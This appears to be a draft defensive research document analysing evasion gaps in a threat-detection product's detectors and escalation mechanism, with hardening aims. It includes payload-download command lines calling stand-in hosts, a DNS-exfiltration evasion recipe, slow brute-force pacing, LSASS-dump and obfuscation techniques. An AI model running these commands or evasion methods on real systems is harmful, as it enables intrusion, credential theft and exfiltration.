---
title: "01 -- Adversarial Evasion and Detection Robustness"
series: Swarm Hardening (1 of 8)
version: "0.3"
date: 2026-04-08
status: Draft
authors: Swarm Team Six Research
---

# 01 -- Adversarial Evasion and Detection Robustness

## Analysis of the ClawdStrike Ambush Detection Surface

> Research document for the `swarm-whisker` crate detection hardening effort.
> Source: `crates/swarm-whisker/src/`, `crates/swarm-pheromone/src/substrate.rs`,
> `crates/swarm-core/src/pheromone.rs`

> **Series Note**
> - This is the first document in the Swarm Hardening series.
> - It focuses on adversarial evasion techniques against the current detector
>   implementation and concrete hardening recommendations.
> - Series-wide status and reading order are maintained in
>   [00-OVERVIEW.md](00-OVERVIEW.md).

---

## Table of Contents

1. [Abstract](#1-abstract)
2. [Threat Model: Adversary Capabilities Against STS](#2-threat-model-adversary-capabilities-against-sts)
3. [Living-off-the-Land Binary (LOLBin) Evasion](#3-living-off-the-land-binary-lolbin-evasion)
4. [Timing-Based Evasion](#4-timing-based-evasion)
5. [Detector Poisoning via the Pheromone Substrate](#5-detector-poisoning-via-the-pheromone-substrate)
6. [Mimicry Attacks](#6-mimicry-attacks)
7. [Evasion Resistance by Detector](#7-evasion-resistance-by-detector)
8. [Compound Evasion Chains](#8-compound-evasion-chains)
9. [Fileless and Memory-Only Evasion Techniques](#9-fileless-and-memory-only-evasion-techniques)
10. [Command-Line Obfuscation Depth Analysis](#10-command-line-obfuscation-depth-analysis)
11. [Adversary Profile Analysis](#11-adversary-profile-analysis)
12. [Unused and Dead-Code Detection Paths](#12-unused-and-dead-code-detection-paths)
13. [Hardening Recommendations](#13-hardening-recommendations)
14. [Evaluation Framework](#14-evaluation-framework)
15. [Adversarial Testing](#15-adversarial-testing)
16. [Open Questions and Future Work](#16-open-questions-and-future-work)
- [Cross-References](#cross-references)
- [References](#references)

---

## 1. Abstract

ClawdStrike Ambush detects threats through eight pluggable detection strategies
dispatched by a composite evaluator. Each strategy operates on single telemetry
events, applying configurable heuristics with confidence thresholds (high: 0.90,
medium: 0.70) and ATT&CK tactic tagging. Findings are deposited into a pheromone
substrate that uses exponential-decay concentration and anti-Sybil source-diversity
requirements (default `min_sources_for_escalation = 2`) to drive swarm-mode
escalation.

This document systematically analyzes the evasion surface of each detector, the
pheromone escalation mechanism, and their compound interactions. We identify
concrete blind spots arising from string-matching heuristics, fixed time windows,
single-event evaluation semantics, and the concentration-based escalation model.
For each class of evasion, we propose hardening measures grounded in the actual
Rust implementation, ranging from low-cost configuration changes (name
normalization, indicator list expansion) to architectural additions that would
require new crate-level capabilities (hash-based identity, behavioral baselines).

The goal is to enumerate what a sophisticated adversary (APT-level, with kernel
access, tooling flexibility, and time) can do against the current detector suite,
and to produce an actionable roadmap for closing those gaps.

---

## 2. Threat Model: Adversary Capabilities Against STS

### 2.1 Adversary Tiers

We define three adversary tiers against which to evaluate detector robustness:

**Tier 1 -- Script Kiddie / Commodity Malware.** Uses well-known tools
(Mimikatz, PowerShell Empire, Cobalt Strike defaults) without modification.
Command lines contain default flags and known process names. Current detectors
are designed primarily for this tier and should perform well.

**Tier 2 -- Skilled Operator.** Modifies tooling to avoid signature-based
detection. Renames binaries, uses alternative LOLBins not in the default
indicator lists, adjusts beacon timing to evade periodicity detection, and
splits operations across time windows. This tier exploits gaps in the current
string-match and windowed-threshold approach.

**Tier 3 -- APT / Nation-State.** Has kernel-level access, can inject telemetry,
modify sensor output, or suppress events entirely. May attempt to poison the
pheromone substrate, forge agent identities, or exploit timing side-channels in
the detection pipeline. This tier requires architectural defenses beyond what
the current detector suite provides.

### 2.2 Assumed Adversary Knowledge

We assume the adversary:

- **Knows the detection logic.** The detector code is deterministic Rust with
  configurable profiles. An adversary who compromises a node with an STS agent
  can read the compiled binary and reconstruct all indicator lists, thresholds,
  and window sizes. Security through obscurity provides no defense.

- **Knows the pheromone parameters.** Default half-life (3600s), evaporation
  threshold (0.01), alert threshold (2.0), incident threshold (5.0), and
  `min_sources_for_escalation` (2) are configuration values an adversary can
  extract.

- **Can control telemetry timing.** The adversary controls when their tools
  execute and can spread operations across arbitrary time intervals.

- **Can choose tooling.** The adversary is not bound to any specific tool and
  can substitute equivalent functionality through any available system binary
  or custom code.

### 2.3 What the Adversary Cannot Do (Assumptions)

- **Cannot forge Ed25519 signatures.** The pheromone substrate validates
  signatures via `validate_deposit_signature()` (called at both the
  `ConfiguredPheromoneSubstrate::deposit()` and `InMemoryPheromoneSubstrate::deposit()`
  boundaries) using `ed25519-dalek`. Without an agent's private key, the
  adversary cannot inject arbitrary deposits.

- **Cannot modify the STS binary in memory undetected** (aspirational -- this
  requires self-protection mechanisms covered in doc 07).

- **Cannot suppress all telemetry.** At least some telemetry sources (eBPF,
  ETW, auditd) remain functional. Total sensor blindness is a separate failure
  mode outside this document's scope.

---

## 3. Living-off-the-Land Binary (LOLBin) Evasion

### 3.1 Background

Living-off-the-Land Binaries (LOLBins) are legitimate, signed operating-system
utilities that adversaries abuse to execute arbitrary code, download payloads,
or bypass application whitelisting. Because they are OS-native, they carry valid
signatures and execute from trusted paths.

### 3.2 Current LOLBin Detection in STS

The `suspicious_scripting` detector maintains a configurable `lolbin_processes`
list (default: `mshta`, `certutil`, `regsvr32`, `rundll32`, `cmstp`, `wscript`,
`cscript`) and an `is_lolbin_abuse` function that checks for abuse-specific
command-line patterns per LOLBin. The `supply_chain` detector independently
checks `certutil` and `rundll32` for signed-binary abuse.

### 3.3 Coverage Gaps

**Gap 1: Missing LOLBins.** The LOLBAS project (lolbas-project.github.io)
catalogs 150+ Windows LOLBins. STS covers 7. Notable omissions:

| LOLBin | Abuse Pattern | Risk |
|--------|--------------|------|
| `msiexec` | `msiexec /q /i http://evil/payload.msi` | Downloads and installs arbitrary MSI packages |
| `bitsadmin` | `bitsadmin /transfer job http://evil/payload.exe C:\Temp\payload.exe` | Background download, survives reboots |
| `installutil` | `installutil /logfile= /LogToConsole=false /U payload.dll` | .NET assembly execution bypassing AppLocker |
| `regasm` / `regsvcs` | `regasm /U payload.dll` | COM registration abuse for code execution |
| `msxsl` | `msxsl.exe customers.xml transform.xsl` | XML transform-based code execution |
| `pcalua` | `pcalua.exe -a payload.exe` | Program Compatibility Assistant proxy execution |
| `forfiles` | `forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\payload.exe"` | Command execution via file search |
| `desktopimgdownldr` | Used via COM for file download | Stealthy download through `DesktopImageDownloader` |
| `esentutl` | `esentutl.exe /y \\attacker\share\payload.exe /d payload.exe` | File copy from remote share |
| `expand` | `expand \\attacker\share\payload.cab C:\temp\payload.exe` | Cabinet extraction from remote |
| `ieexec` | `ieexec.exe http://evil/payload.exe` | IE executable download and run |
| `presentationhost` | XAML-based code execution | Rare but unmonitored |

**Gap 2: Process-name-only matching.** The LOLBin check first finds a match
via `process_name.contains(lolbin)` in `evaluate_process()`, then delegates to
`is_lolbin_abuse()` for per-LOLBin command-line pattern matching. Note that
the match is on the process name only -- command-line content is checked
afterward for abuse patterns, but only if the process name already matched.
An adversary can:

- **Copy and rename** a LOLBin: `copy certutil.exe c:\temp\helper.exe` then
  execute `helper.exe -urlcache -f http://evil/payload`. The process name
  `helper.exe` will not match `certutil` in the indicator list, so the
  command-line check is never reached.

- **Use absolute path execution** without the LOLBin name appearing in
  `process_name`: some telemetry sources report only the filename, but if the
  sensor reports the full path, and the binary was copied to a non-standard
  location, the `process_name` field may not contain the expected substring.

**Gap 3: Abuse-pattern completeness.** The `is_lolbin_abuse` function has a
hardcoded `match` statement that only checks specific patterns per LOLBin. For
example, `certutil` is checked for `-urlcache` or `-verifyctl` with HTTP URLs,
but `certutil -decode encoded.b64 decoded.exe` (base64 decode abuse) is missed.
Similarly, `rundll32` is checked for `javascript:` or HTTP URLs, but
`rundll32 comsvcs.dll MiniDump` (LSASS dump) is missed.

**Gap 4: Linux/macOS LOLBins.** The current LOLBin list is entirely
Windows-focused. Linux equivalents are unmonitored:

| LOLBin | Platform | Abuse Pattern |
|--------|----------|--------------|
| `curl` / `wget` | Linux/macOS | Download and pipe to shell |
| `python` / `python3` | All | Inline code execution |
| `openssl` | Linux/macOS | File encoding, network connections |
| `busybox` | Linux | Multi-tool with networking, file ops |
| `nsenter` | Linux | Container escape via namespace entry |
| `kubectl exec` | Linux | Container-to-container lateral movement |

### 3.4 Which Detectors Are Vulnerable

| Detector | LOLBin Vulnerability | Severity |
|----------|---------------------|----------|
| `suspicious_scripting` | Renamed LOLBins bypass process-name match; missing LOLBins entirely undetected | High |
| `supply_chain` | Shares `certutil` and `rundll32` detection but uses `normalize_process_name()` (exact match after stripping path/`.exe`) rather than `contains()` -- a renamed binary evades both, but the matching semantics differ between detectors | High |
| `credential_access` | No LOLBin awareness; `certutil -decode` for credential extraction is invisible | Medium |
| `lateral_movement` | `wmic` and `psexec` are in the indicator list but can be renamed; `dcom` lateral movement is not covered | High |
| `persistence` | No LOLBin awareness; `schtasks` is detected by content preview but `at.exe`, `bitsadmin` persistence are missed | Medium |
| `dns_exfiltration` | Not affected (works on DNS query content, not process names) | Low |
| `network_connect` | Not affected (works on network metadata) | Low |
| `composite` | Inherits all vulnerabilities from constituent detectors | High |

---

## 4. Timing-Based Evasion

### 4.1 Overview

Many detectors use windowed thresholds to detect bursts of activity. An adversary
who understands the window parameters can operate just below detection thresholds
or spread activity across window boundaries.

### 4.2 Current Window Parameters

| Detector | Window | Threshold | Default Value |
|----------|--------|-----------|--------------|
| `dns_exfiltration` | `burst_window_ms` | `query_burst_threshold` | 60,000ms (1 min), 8 queries |
| `lateral_movement` | `auth_window_ms` | `rdp_failure_threshold` | 300,000ms (5 min), 3 failures |
| `network_connect` | `beacon_window_ms` | `beacon_min_sample_count` | 900,000ms (15 min), 4 samples |
| `network_connect` | -- | `beacon_min_interval_ms` | 15,000ms (15 sec) |
| `network_connect` | -- | `beacon_max_jitter_ratio` | 0.20 |

### 4.3 Slow-and-Low DNS Exfiltration

The DNS exfiltration detector fires on burst volume when a single source sends
`query_burst_threshold` (8) queries within `burst_window_ms` (60s). An adversary
can exfiltrate data at 7 queries per minute indefinitely without triggering the
volume heuristic. At ~200 bytes per DNS label, this yields:

```
7 queries/min * 200 bytes/query = 1,400 bytes/min = 84 KB/hour
```

This is sufficient for credential exfiltration, configuration data, or slow
document theft. The entropy heuristic provides a second layer, but only if the
subdomain exceeds `min_subdomain_length` (20 chars) AND entropy exceeds
`entropy_threshold` (3.5 bits). An adversary using dictionary-word encoding
(e.g., mapping bytes to common words: `apple-banana-cherry.evil.com`) can keep
entropy below 3.5 while still encoding arbitrary data.

**Evasion recipe:**
1. Encode data as dictionary words in subdomains (low entropy).
2. Keep subdomains under 20 characters (or just above, with low entropy).
3. Send at most 7 queries per 60-second window.
4. Use A/AAAA query types (not TXT/NULL/CNAME, which are flagged as suspicious).

### 4.4 Slow RDP Brute-Force

The lateral movement detector triggers on `rdp_failure_threshold` (3) failed
RDP attempts within `auth_window_ms` (300s / 5 minutes). An adversary can
attempt 2 passwords every 5 minutes = 24 passwords/hour = 576 passwords/day.
Against a password list of common credentials, this is operationally viable for
many targets and completely invisible to the detector.

**Additional timing gap:** The tracker uses a sliding window keyed on
`{source_host}->{target_host}`. An adversary who rotates source hosts (e.g.,
through multiple compromised workstations) resets the counter for each pair,
allowing unlimited attempts as long as no single source-target pair exceeds
the threshold.

### 4.5 Beacon Evasion

The network connect detector's beaconing analysis requires:
- At least `beacon_min_sample_count` (4) connections within `beacon_window_ms`
  (900s / 15 min).
- Intervals must exceed `beacon_min_interval_ms` (15s).
- Jitter ratio (stddev/mean) must be below `beacon_max_jitter_ratio` (0.20).

**Evasion strategies:**

1. **High jitter:** Add random delays exceeding 20% of the mean interval. A
   60-second beacon with +/- 15 seconds of jitter yields a jitter ratio of
   ~0.25, just above the threshold. The adversary maintains reliable C2 while
   evading periodicity detection.

2. **Long intervals:** Beacon every 20+ minutes. With a 15-minute window and
   a 20-minute interval, at most one connection falls within any window, never
   reaching the 4-sample minimum.

3. **Connection multiplexing:** Use a single long-lived connection (WebSocket,
   HTTP/2) instead of repeated TCP connections. The detector only sees one
   `NetworkConnect` event for the initial connection, not the ongoing data
   exchange.

4. **Domain fronting / CDN pivoting:** Route C2 through legitimate CDN
   infrastructure (e.g., cloudfront.net, akamaied.net). The destination IP
   changes per connection, preventing the `BeaconKey` from aggregating samples
   for the same logical C2 channel.

### 4.6 Beacon Jitter Model Limitations (Expanded in v0.3)

The current beacon detection uses a coefficient-of-variation (CV) model:
`jitter_ratio = stddev(intervals) / mean(intervals)`. With the default
`beacon_max_jitter_ratio` of 0.20, this model captures only **tightly periodic**
beacons -- those with less than 20% variation around their mean interval.

**Modern C2 jitter profiles that evade this model:**

| C2 Framework | Default Jitter | Max Configurable | Evades 0.20 Threshold |
|-------------|---------------|-------------------|----------------------|
| Cobalt Strike | 0% (default) | 100% | No (at default); Yes (at >= 21%) |
| Sliver | 30% | 100% | Yes |
| Brute Ratel | 40% | Custom | Yes |
| Mythic | Configurable | 100% | Yes (at >= 21%) |
| PoshC2 | 20% | Configurable | Borderline (at exactly 20%) |

At 40% jitter (a conservative adversary setting), a 60-second base interval
produces intervals ranging from 36s to 84s. The CV of a uniform distribution
on [0.6*mean, 1.4*mean] is approximately 0.23, exceeding the 0.20 threshold.
At 50% jitter, the CV rises to approximately 0.29.

**The 0.20 threshold has no documented empirical basis.** The gap report
correctly identifies that this value appears to be chosen by convention rather
than through ROC curve analysis against labeled beacon/non-beacon data. Raising
the threshold to 0.35 or 0.40 would catch the majority of real-world C2
configurations but would also increase false positives from legitimate polling
applications (NTP sync, health checks, telemetry heartbeats). Without a
false-positive rate analysis against production traffic baselines, the optimal
threshold cannot be determined.

**Additional model weaknesses:**
- **Non-Gaussian jitter distributions.** The CV model assumes approximately
  symmetric jitter. Exponential backoff (common in retry-on-failure C2) produces
  right-skewed distributions where the CV is inflated beyond the actual
  periodicity, causing missed detections even for periodic traffic.
- **Sleep-based beacons.** C2 frameworks that add a random sleep drawn from an
  exponential distribution (rather than uniform) produce intervals that the
  mean/CV model cannot characterize accurately.
- **Sample size sensitivity.** With only 4 required samples, the CV estimate
  has high variance. A formal power analysis would show that N=4 provides
  weak statistical evidence for periodicity, particularly at higher jitter ratios.

### 4.7 Cross-Window Splitting

All windowed detectors share a fundamental vulnerability: operations that straddle
window boundaries are counted in separate windows. An adversary can intentionally
time operations at the boundary of the sliding window:

```
Window 1: [T=0 ... T=60s]  -- 7 DNS queries (below threshold of 8)
Window 2: [T=61s ... T=121s] -- 7 DNS queries (below threshold of 8)
Total: 14 queries in ~62 seconds, never triggering the burst detector
```

This is inherent to any fixed-window or sliding-window approach without
multi-scale analysis.

---

## 5. Detector Poisoning via the Pheromone Substrate

### 5.1 Pheromone Escalation Mechanism

The pheromone substrate drives swarm-mode transitions (Normal -> Alert -> Incident)
based on concentration. The `PheromoneConcentration::exceeds_threshold` method
requires:

```rust
self.total_strength >= strength_threshold && self.distinct_sources >= min_sources
```

With defaults: alert at `total_strength >= 2.0` AND `distinct_sources >= 2`,
incident at `total_strength >= 5.0` AND `distinct_sources >= 2`.

### 5.2 Anti-Sybil Analysis

The anti-Sybil mechanism is source-diversity counting: `distinct_sources` is
computed as the number of unique `agent_id.0` values among non-evaporated
deposits for a threat class. This prevents a single compromised agent from
unilaterally escalating the swarm to incident mode.

**Important implementation detail:** The `stream.rs` module creates
strategy-scoped agent IDs via `strategy_scoped_agent_id()`, producing values
like `"whisker-a:suspicious_process_tree"`. Since `concentration_for()` counts
unique `agent_id.0` strings, two different detection strategies on the same
physical agent are counted as two distinct sources. This means a single
physical agent running multiple detectors can contribute multiple "sources"
toward the `min_sources_for_escalation` threshold, partially undermining the
anti-Sybil intent. The test `query_counts_strategy_scoped_agent_ids_as_distinct_sources`
in `substrate.rs` confirms this is intentional behavior.

**Strengths:**
- Each deposit requires a valid Ed25519 signature, preventing forged deposits
  without key compromise.
- The `ConfiguredPheromoneSubstrate::deposit()` method calls
  `validate_deposit_signature()` before persisting, providing cryptographic
  authentication at the ingestion boundary.

**Weaknesses:**

1. **Low `n_min` = 2.** Only two distinct agents must agree for escalation.
   If an adversary compromises two agents (obtains their signing keys), they
   can manufacture arbitrary escalations. In a small swarm (e.g., 3-5 agents),
   compromising 2 may be feasible.

2. **No rate limiting per agent.** A single agent can deposit unlimited
   pheromones per unit time. While this cannot escalate alone (requires
   `n_min` sources), it inflates `total_strength` arbitrarily. Combined
   with one additional compromised agent, this enables immediate escalation
   to any threshold.

3. **No deposit content validation.** The substrate validates the signature
   but does not validate that the deposit's `threat_class`, `severity`, or
   `confidence` values are reasonable given the detector's findings. A
   compromised agent can deposit `confidence: 1.0` for any threat class
   regardless of whether a real detection occurred.

### 5.3 Alert Fatigue Attack

An adversary who compromises a single agent cannot escalate (needs 2 sources),
but can still cause damage through alert fatigue:

1. Deposit many pheromones for threat classes that are not actually active.
2. Each deposit individually below the alert threshold but collectively creating
   noise.
3. Over time, operators may tune down thresholds or ignore pheromone signals,
   degrading the system's effective sensitivity.

The exponential decay (half-life 3600s, evaporation at 0.01) means a single
deposit with `confidence: 0.9` evaporates in approximately:

```
0.9 * 0.5^(t/3600) < 0.01
t > 3600 * log2(90) ≈ 3600 * 6.49 ≈ 23,364 seconds ≈ 6.5 hours
```

A compromised agent depositing once per minute can maintain an elevated
`total_strength` for its threat class indefinitely.

### 5.4 Escalation Suppression

Conversely, an adversary may want to *prevent* escalation during an active
attack. Since escalation requires `distinct_sources >= 2`, an adversary who
compromises one of a small number of agents has effectively reduced `n_min`
by 1. If the swarm has only 2 active agents and one is compromised, the
compromised agent can simply refuse to deposit pheromones for the threat class
the adversary is actively exploiting, preventing escalation entirely.

This is a silent denial-of-service on the escalation mechanism that requires
no anomalous behavior -- the compromised agent simply does nothing.

### 5.5 Concentration Dilution

The `concentration_for` function sums `strength_at(now)` across all non-evaporated
deposits for a threat class. There is no normalization by deposit count. An
adversary who controls the timing of their attack can wait until existing
pheromone deposits have partially decayed, reducing `total_strength` below the
alert threshold before launching the next phase of their operation.

With a half-life of 3600s, strength decays to:
- 50% after 1 hour
- 25% after 2 hours
- 12.5% after 3 hours
- 6.25% after 4 hours

An adversary who observes a detection event can wait 4 hours for the resulting
pheromone to decay to ~6% of its original strength before resuming operations.

---

## 6. Mimicry Attacks

### 6.1 Definition

A mimicry attack crafts malicious telemetry that is statistically
indistinguishable from benign activity according to the detector's decision
function. Unlike evasion (avoiding detection entirely), mimicry operates within
the detector's input space while remaining below detection thresholds.

### 6.2 Process Tree Mimicry

The `SuspiciousProcessTreeDetector` triggers when a process in `suspicious_parents`
(winword, excel, outlook, acrord32, teams) spawns a child in `suspicious_children`
(powershell, pwsh, cmd, sh, bash, curl, wget). The detector uses
`Vec::contains()` for exact equality on lowercased names -- not substring
matching. This means `winword.exe` will NOT match `winword` in the parent
list; the telemetry must report the bare process name. Confidence is elevated
to `high_confidence_threshold` when the command line contains encoded flags
(`-enc`, `base64`, `frombase64string`) or download hints (`http://`,
`https://`, `downloadstring`).

**Mimicry approach:** Use intermediate processes to break the parent-child chain:

```
winword.exe -> svchost.exe -> cmd.exe -> powershell.exe
```

The detector sees `parent=svchost`, `child=powershell`. Since `svchost` is not
in `suspicious_parents`, no finding is produced. The adversary achieves the same
outcome (macro -> PowerShell execution) with one extra process hop.

Process injection achieves the same result: inject a thread into `svchost.exe`
that spawns `powershell.exe`. The parent process of the spawned shell is now
`svchost.exe`, not the original Office application.

### 6.3 DNS Query Mimicry

The DNS exfiltration detector uses Shannon entropy as a key heuristic. The
`extract_subdomain` function strips the last two labels (TLD + domain) and
joins the remaining labels *without separators* (e.g., `a.b.evil.com` yields
`ab`), so entropy is computed on the concatenated subdomain string. An
adversary can craft DNS labels that encode data while maintaining low entropy:

**Dictionary encoding:** Map each byte to a common English word. The label
`the-cat-sat-on-the` has Shannon entropy of approximately 2.8 bits (well below
the 3.5 threshold) while encoding 5 bytes of arbitrary data through a
256-word dictionary lookup.

**Padding with repeated characters:** Append low-entropy padding to reduce
overall label entropy. `a1b2c3AAAAAAAAAAAAAAAA.evil.com` has lower entropy than
`a1b2c3d4e5f6g7h8.evil.com` despite carrying the same payload.

**Short subdomain bypass:** Keep subdomains below `min_subdomain_length` (20).
A subdomain of 19 characters is never evaluated for entropy, regardless of
content. At ~19 bytes per query and 7 queries/minute, this yields:

```
19 * 7 = 133 bytes/min = ~8 KB/hour
```

Slow but sufficient for credential exfiltration.

### 6.4 Network Connect Mimicry

The beaconing detector can be defeated by making C2 traffic mimic legitimate
application patterns:

- **Piggyback on legitimate traffic:** Embed C2 data in HTTP headers of
  requests to legitimate websites (header-based steganography). The network
  connect events show standard ports (80/443) to legitimate IPs.

- **Aperiodic callbacks:** Use pseudo-random intervals drawn from a distribution
  that matches user browsing patterns (Poisson process with variable rate).
  The jitter ratio will exceed the 0.20 threshold, evading periodicity detection.

- **Use process-port allowlisted combinations:** If `chrome` is allowlisted for
  ports 80/443, inject C2 code into the Chrome process. All network connections
  from Chrome to port 443 are allowlisted.

### 6.5 Credential Access Mimicry

The credential access detector watches for:
- Access to protected processes (lsass.exe)
- Reads of sensitive registry paths (HKLM\SAM, HKLM\SECURITY, HKLM\SYSTEM\...\LSA)
- Kerberoasting patterns (Kerberos TGS from suspicious processes)

**Mimicry approaches:**

- **LSASS dump via legitimate tools:** Use `comsvcs.dll` MiniDump called through
  `rundll32` (which is not in the `protected_processes` list for credential
  access). The credential access detector checks `target_process`, not the
  dumping tool. If the telemetry source does not report LSASS as the target
  process (e.g., reports only the file write to disk), the detection is missed.

- **Indirect credential access:** Read credentials from backup files
  (SYSTEM.bak, SAM.bak) that are not at the monitored registry paths. Extract
  credentials from browser credential stores, application configs, or memory
  dumps of non-protected processes. None of these are monitored.

- **Kerberoast from a non-suspicious process:** The suspicious kerberoast
  process list includes `powershell`, `pwsh`, `rubeus`, `mimikatz`, `kekeo`,
  `cmd`, `python`, `python3`, `impacket`. An adversary can compile a custom Go
  or Rust binary to request TGS tickets. The process name will not match any
  entry in the suspicious list.

---

## 7. Evasion Resistance by Detector

This section provides a systematic walkthrough of each detector's evasion
surface, summarizing the findings from Sections 3-6 and adding detector-specific
analysis.

### 7.1 `suspicious_scripting` (SuspiciousScriptingDetector)

**What it detects:**
- Encoded PowerShell commands: requires `process_name` containing `powershell`
  or `pwsh` AND command line matching any of (`-enc`, `-encodedcommand`,
  `frombase64string`, `base64`). Severity: Critical.
- Download-and-execute chains: command line must match a download indicator
  (`downloadstring`, `downloadfile`, `new-object net.webclient`,
  `invoke-webrequest`, `iwr `) AND an execution indicator (`iex`,
  `invoke-expression`, `start-process`, `cmd /c`). Note: the `iwr ` indicator
  includes a trailing space, so `iwr` at end-of-line does not match.
  Severity: Critical.
- LOLBin abuse for 7 binaries (`mshta`, `certutil`, `regsvr32`, `rundll32`,
  `cmstp`, `wscript`, `cscript`) with per-LOLBin pattern matching via
  `is_lolbin_abuse()`. All checks are lowercased. Severity: High.

**Evasion surface:**

| Technique | Difficulty | Impact |
|-----------|-----------|--------|
| Rename LOLBin to avoid process-name match | Trivial | Complete bypass |
| Use unlisted LOLBin (e.g., `msiexec`, `bitsadmin`) | Trivial | Complete bypass |
| PowerShell string obfuscation (`IEX` -> `I"E"X`, `&('IE'+'X')`) | Easy | Bypasses exact string match for execution indicators |
| Use `iwr` at end-of-line (no trailing space) | Trivial | The download indicator `"iwr "` includes a trailing space; `iwr\n` does not match |
| Use `System.Net.Http.HttpClient` instead of `Net.WebClient` | Easy | Bypasses download indicator match |
| PowerShell v2 downgrade (`powershell -version 2`) to avoid AMSI | Easy | Not detected; no version check |
| Use C# `Assembly.Load` instead of PowerShell for .NET execution | Moderate | Entirely different telemetry profile |
| Encode commands with non-base64 encoding (XOR, AES) | Moderate | Bypasses `base64`/`-enc` indicators |

**Robustness assessment: LOW.** Heavy reliance on string matching in command
lines. Any string obfuscation or tool substitution bypasses detection.

### 7.2 `credential_access` (CredentialAccessDetector)

**What it detects:**
- Access to protected processes (`lsass.exe`, `lsass`) via `RegistryAccess`
  events where `target_process` matches a protected process name
- Reads of sensitive registry paths (`hklm\sam`, `hklm\security`,
  `hklm\system\currentcontrolset\control\lsa`) via `RegistryAccess` events
  where `access_type == "read"` and path prefix-matches
- Kerberoasting from suspicious processes (list of 9 process names) via
  `AuthenticationEvent` with `auth_type == "kerberos_tgs"`. Note:
  `normalize_process_name()` strips path prefixes and `.exe` suffixes before
  comparison, so `C:\Tools\mimikatz.exe` correctly matches `mimikatz`.

**Evasion surface:**

| Technique | Difficulty | Impact |
|-----------|-----------|--------|
| LSASS dump via `comsvcs.dll` with `rundll32` | Easy | Detected by `supply_chain` but NOT `credential_access` unless target_process is reported |
| Read SAM from shadow copy (`vssadmin` + `copy`) | Easy | Shadow copy path will not match `hklm\sam` |
| Use custom binary for Kerberoasting | Easy | Process name not in suspicious list |
| Extract credentials from browser stores | Trivial | Entirely unmonitored path |
| Use `ntdsutil` for AD database extraction | Easy | Not monitored |
| DCSync via non-listed process | Easy | Not monitored (would need AuthenticationEvent for replication) |

**Robustness assessment: LOW-MEDIUM.** Good coverage of the most obvious
credential access paths (LSASS, SAM registry), but the process-name-based
kerberoast detection is trivially bypassable, and indirect credential access
paths are unmonitored.

### 7.3 `dns_exfiltration` (DnsExfiltrationDetector)

**What it detects:**
- High-entropy subdomains (Shannon entropy >= 3.5 for subdomains >= 20 chars).
  The `extract_subdomain` function joins all labels except the last two
  (TLD + domain) *without separators*. A finding requires entropy >= threshold
  OR a matched tunneling pattern OR excessive query volume. Short subdomains
  (< `min_subdomain_length`) are skipped unless a tunneling pattern matches
  or volume is excessive.
- Known tunneling patterns (`dnscat`, `iodine`) via substring match on the
  full query name
- Suspicious query types (TXT, NULL, CNAME) -- used to elevate confidence
  from medium to high, not as a standalone trigger
- Query volume bursts (8+ queries per source in 60s sliding window, keyed
  on `source_ip` or `host_id`)

**Evasion surface:**

| Technique | Difficulty | Impact |
|-----------|-----------|--------|
| Dictionary-word encoding (low entropy) | Easy | Bypasses entropy threshold |
| Short subdomains (< 20 chars) | Trivial | Skips entropy evaluation entirely |
| Rate-limit to 7 queries/min | Trivial | Below burst threshold |
| Use A/AAAA query types | Trivial | Avoids suspicious query type flag |
| Use HTTPS-based exfiltration instead of DNS | Trivial | Entirely different channel |
| Custom tunneling tool (not dnscat/iodine) | Trivial | Bypasses known-pattern match |
| Distribute queries across multiple source IPs | Easy | Resets per-source burst counter |
| Use allowlisted domain as exfiltration endpoint | Moderate | Completely invisible if operator adds CDN/cloud domains to allowlist |

**Robustness assessment: MEDIUM.** The entropy heuristic is a strong signal
but can be defeated with encoding. The multi-layer approach (entropy + patterns
+ volume + query type) provides defense in depth, but each layer can be
individually bypassed. The combination of short subdomains + low volume + A
records provides a complete bypass.

### 7.4 `lateral_movement` (LateralMovementDetector)

**What it detects:**
- Remote execution tools: `wmic`, `psexec`, `winrs`, `smbexec`,
  `invoke-command`, `new-pssession`, `enter-pssession`, `invoke-cimmethod`
  (matched against both `process_name` and `command_line`)
- Each with specific command-line context checks (e.g., `wmic` requires
  `/node:` AND `process call create`)
- Unusual SSH from non-allowed sources
- Failed RDP brute-force (3+ failures in 5 min per source-target pair)

**Evasion surface:**

| Technique | Difficulty | Impact |
|-----------|-----------|--------|
| Rename `psexec` binary AND scrub command-line args | Easy | The indicator match checks both `process_name` and `command_line`; renaming alone is insufficient if `psexec` appears in args. Both must be clean. |
| Use `schtasks /create /s remote_host` for remote execution | Easy | Not in indicator list |
| Use WinRM with `evil-winrm` (custom binary name) | Easy | Not matching `winrs` in process name or command line |
| DCOM lateral movement (`MMC20.Application`, `ShellBrowserWindow`) | Moderate | Entirely unmonitored |
| SSH from a compromised jump box in the allowed list | Easy | Explicitly allowlisted |
| Rotate source hosts for RDP brute-force (2 attempts per pair) | Easy | Below 3-attempt threshold |
| Use RDP over non-standard ports or tunnels | Moderate | Auth type may not be reported as `rdp` |
| Pass-the-hash/pass-the-ticket (successful auth, no failures) | Easy | Only failed RDP is tracked; successful lateral movement via stolen creds is invisible |

**Robustness assessment: LOW.** The indicator list is comprehensive for known
tools but trivially bypassed through renaming or tool substitution. The critical
gap is that *successful* lateral movement using stolen credentials produces no
finding at all -- only failed RDP triggers detection.

### 7.5 `persistence` (PersistenceDetector)

**What it detects:**
- Registry run key writes (HKLM/HKCU `...\Run` and `...\RunOnce`) via
  `RegistryPersistence` events where `access_type` is write/set/create/modify/update
  and `registry_path` prefix-matches one of 4 monitored paths. Confidence is
  elevated when `value_data` contains executable extensions (`.exe`, `.dll`,
  `.ps1`, `.bat`, `.cmd`) or tool names (`powershell`, `rundll32`).
- Scheduled task creation: file writes to `system32/tasks/`, `.job`, `.xml`,
  or `content_preview` containing `schtasks`/`<task`
- Cron writes: `/etc/cron`, `/etc/cron.d`, `/var/spool/cron`. Confidence is
  elevated for high-signal patterns (`* * *`, `@reboot`, `/bin/`, `/usr/bin/`).
- Systemd timer creation: `/etc/systemd/system`, `/usr/lib/systemd/system`,
  `.timer` extension, `[Timer]`/`OnCalendar=` content
- Note: the profile includes a `dormancy_window_secs` field (default: 86400s)
  which is recorded in evidence but not currently used for detection logic.

**Evasion surface:**

| Technique | Difficulty | Impact |
|-----------|-----------|--------|
| Use WMI event subscriptions (`__EventFilter`) | Easy | Not monitored (no WMI event telemetry) |
| Use COM hijacking (`HKCU\...\InProcServer32`) | Easy | Registry path not in `suspicious_registry_run_paths` |
| Use `HKLM\...\RunServicesOnce` (legacy) | Easy | Not in the 4 monitored paths |
| DLL search order hijacking | Moderate | File write to application directory, not monitored persistence paths |
| Scheduled task via `at.exe` (legacy) | Easy | Only file-based detection; `at.exe` process not checked |
